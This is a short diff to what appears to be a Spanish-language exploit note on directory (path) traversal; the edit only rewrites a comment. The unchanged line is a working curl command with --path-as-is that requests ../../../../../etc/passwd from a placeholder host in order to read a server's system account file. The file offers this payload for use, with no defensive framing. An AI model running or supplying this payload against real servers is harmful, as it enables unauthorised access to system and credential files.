@@ -1,6 +1,6 @@
 # directoriotrasversal
 #
-# Exploits para extraer por http la password en la carperta Linux /etc/passwd, en paginas vulnerables a directorio traversal.
+# Exploits para explotar la vulnerabilidade de directorio trasversal o path traversal.
 #
 
 curl --path-as-is -k -v http://ip:80/../../../../../etc/passwd
